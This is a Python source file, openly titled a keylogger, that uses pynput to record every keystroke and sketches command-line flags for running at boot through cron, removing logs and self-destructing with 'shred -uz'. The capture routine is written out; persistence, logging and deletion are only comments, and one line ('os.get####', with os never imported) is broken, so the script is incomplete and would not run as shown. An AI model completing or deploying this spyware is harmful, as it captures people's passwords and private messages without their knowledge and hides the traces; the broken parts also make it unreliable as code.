#! /usr/bin/env python3

from pynput import keyboard
import argparse
import time


parser = argparse.ArgumentParser(description="Python3 Keylogger")
lst2 = []
fullstr = []
fullstr2 = ""
F = '1'

def capturetheflags():
	## Flags
	parser = argparse.ArgumentParser()

	parser.add_argument("-rs", "--run-at-start", help="Run the program on bootup", action="store_true")
	parser.add_argument("-rx", "--remove-start", help="Stop the program from running on bootup", action="store_true")
	parser.add_argument("-rl", "--remove-logs", help="Remove all the keystroke logs", action="store_true")
	parser.add_argument("-i", "--info", help="Displays information about the program and its files", action="store_true")
	parser.add_argument("-sd", "--self-destruct", help="!!! This action completely destroys the program !!!", action="store_true")

	args = parser.parse_args()

	rs = getattr(args, 'run_at_start')
	rx = getattr(args, 'remove_start')
	rl = getattr(args, 'remove_logs')
	i = getattr(args, 'info')
	sd = getattr(args, "self_destruct")

	if rs == True:
		# Looks for script name in chron file
		## If not found, open chron file and add script line and save
		## close file
		print ("Run at start enabled")

	if rx == True:
		# Looks for script name in chron file
		## If found, open chron file and remove script line and save
		## close file
		print ("Run at start disabled")	

	if rl == True:
		# Looks for where/the/logs/are/kept/ and removes them
		print ("Removing Logs..")	

	if i == True:
		# Looks for created files & grabs memory & cpu usage
		print ("Obtaining information..")

	if sd == True:
		# Looks for all files associated with program and puts them into a list
		# & 
		# if script name is in chron file
		print("[WARNING]: This will delete the program and associated files from the system.")
		time.sleep(1.6)
		print("[WARNING]: This action cannot be undone.")
		while True:
			time.sleep(2.2)
			confirm = input(" > Confirm? [Y/N]: ")
			# If confirmed run task
			if confirm.lower() == 'y':
				print("Confirmed")
				## For each file in file, shred -uz file
				return False
			# If cancelled run task
			elif confirm.lower() == 'n':
				print("Cancelled")
				return False
			else:
				print("input not recgonized try again.")


def sort_key(key):
	global F
	try:
		# Checks if the key pressed is a non-character key
		if "Key." in str(key):
			keyString = ("["+str(key).upper()[4:]+"]")

			# Handles Enter
			if keyString == ("[ENTER]"):
				fullstr.append(keyString+"\n")
				## Creates a string from the keys pressed
				fullstr2 = ''.join([str(i) for i in fullstr])
				## Prints current log
				print (fullstr2+'\n')

			# Handles Spaces	
			elif keyString == ("[SPACE]"):
				fullstr.append(' ')

			# Handles Shift
			elif keyString == ("[SHIFT]"):
				pass

			# Handles Caps (on/off)
			elif keyString == ("[CAPS_LOCK]"):

				# Checks if last caps used was [CAPS_OFF], doesnt work properly is caps lock is enabled before program execution
				if F == '1':
					keyString = "[CAPS_ON]"
					fullstr.append(keyString)
					F = '0'

				# If caps isnt ON (0) run this
				else:
					keyString = "[CAPS_OFF]"
					fullstr.append(keyString)
					F = '1'

			# If the key isnt logged above or falls within the ASCII spectrum, accept the raw key
			else:
				fullstr.append(keyString)

		# This captures normal ASCII characters
		else:
			keyString = str(key).strip("'")
			#print(keyString+"\n",end='')
			fullstr.append(keyString)
		
	except:
		pass
	
## Main Function
def __main__():
	print("\nOpening Log File...\n")

	capturetheflags()

	## Open log file here
	wLogfile = os.get####
	#starts listening to the keyboard
	try:
		with keyboard.Listener(on_press=sort_key) as l:
			#with each key, run sort
			l.join()
	except:
		print("\nClosing Log File...")
		# Close Log File Here
		exit(0)

if __name__=="__main__":
	__main__()
